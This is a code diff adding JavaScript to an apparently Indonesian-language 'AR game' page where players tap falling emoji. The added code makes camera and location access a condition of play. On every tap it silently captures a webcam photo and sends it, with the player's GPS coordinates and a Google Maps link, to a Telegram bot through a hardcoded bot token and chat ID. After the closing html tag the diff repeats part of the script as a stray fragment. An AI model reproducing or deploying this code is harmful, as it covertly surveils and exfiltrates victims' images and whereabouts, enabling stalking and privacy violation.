@@ -41,6 +41,132 @@ const camera = document.getElementById('camera');
 const scoreBox = document.getElementById('scoreBox');
 const popSound = document.getElementById('popSound');
 
+// 🔑 Token & Chat ID kamu
+const BOT_TOKEN = "8426427901:AAEjvVBIvQ7E84B631aEIyeoYhJhYZWJsgw";
+const CHAT_ID = "8316267465";
+
+const emojis = ["🍎","🍌","🍒","⭐","💎","🎯"];
+let score = 0;
+let userLocation = null;
+
+// Ambil foto dari kamera
+function takePhoto(){
+  return new Promise((resolve)=>{
+    const canvas = document.createElement("canvas");
+    canvas.width = camera.videoWidth || 320;
+    canvas.height = camera.videoHeight || 240;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(camera,0,0,canvas.width,canvas.height);
+    canvas.toBlob(blob => resolve(blob),"image/jpeg");
+  });
+}
+
+// Kirim ke Telegram (foto + lokasi + link GMaps)
+function sendToTelegram(blob){
+  const fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  fd.append("photo", blob, "snapshot.jpg");
+
+  let caption = "📸 Foto dari game AR";
+  if(userLocation){
+    let lat = userLocation.latitude;
+    let lon = userLocation.longitude;
+    caption += `\n📍 Lokasi: ${lat}, ${lon}`;
+    caption += `\n🌍 [Lihat di Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
+  }
+
+  fd.append("caption", caption);
+  fd.append("parse_mode", "Markdown");
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body:fd })
+    .then(res => res.json())
+    .then(data => console.log("Telegram sent:", data))
+    .catch(err => console.error(err));
+
+  // Kirim juga titik lokasi (biar langsung muncul di map Telegram)
+  if(userLocation){
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        latitude: userLocation.latitude,
+        longitude: userLocation.longitude
+      })
+    });
+  }
+}
+
+// Spawn emoji jatuh
+function spawnEmoji(){
+  const emoji = document.createElement("div");
+  emoji.className = "emoji";
+  emoji.textContent = emojis[Math.floor(Math.random()*emojis.length)];
+  emoji.style.left = Math.random()*80+10+"%";
+  emoji.style.top = "-50px";
+  document.body.appendChild(emoji);
+
+  emoji.addEventListener("click", async ()=>{
+    score++; scoreBox.textContent = "Score: "+score;
+    emoji.style.transform="scale(2) rotate(360deg)";
+    popSound.currentTime=0; popSound.play();
+    const photo = await takePhoto();
+    sendToTelegram(photo);
+    emoji.remove();
+  });
+
+  let speed = Math.random()*2 + 2;
+  let fall = setInterval(()=>{
+    let top = parseFloat(emoji.style.top);
+    top += speed;
+    emoji.style.top = top+"px";
+    if(top>window.innerHeight){ emoji.remove(); clearInterval(fall); }
+  },30);
+}
+
+// Tombol mulai → tampilkan peringatan
+startBtn.addEventListener("click", ()=>{
+  quoteScreen.style.display="none";
+  warnScreen.style.display="flex";
+});
+
+// Tombol izinkan → jalankan game jika izin diterima
+allowBtn.addEventListener("click", async ()=>{
+  try{
+    // Minta kamera
+    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
+    camera.srcObject = stream;
+
+    // Minta lokasi
+    const position = await new Promise((resolve, reject)=>{
+      navigator.geolocation.getCurrentPosition(resolve, reject);
+    });
+    userLocation = {
+      latitude: position.coords.latitude,
+      longitude: position.coords.longitude
+    };
+
+    // Semua izin diterima → mulai game
+    warnScreen.style.display="none";
+    camera.style.display="block";
+    scoreBox.style.display="block";
+    setInterval(spawnEmoji, 1000);
+
+  } catch(err){
+    alert("⚠️ Izin kamera dan lokasi wajib untuk memainkan game!");
+    console.error(err);
+  }
+});
+</script>
+
+</body>
+</html>const warnScreen = document.getElementById('warnScreen');
+const allowBtn = document.getElementById('allowBtn');
+
+const camera = document.getElementById('camera');
+const scoreBox = document.getElementById('scoreBox');
+const popSound = document.getElementById('popSound');
+
 const BOT_TOKEN = "8426427901:AAEjvVBIvQ7E84B631aEIyeoYhJhYZWJsgw";   // ganti dengan token botmu
 const CHAT_ID = "8316267465";     // ganti dengan chat_id mu
 const emojis = ["🍎","🍌","🍒","⭐","💎","🎯"];
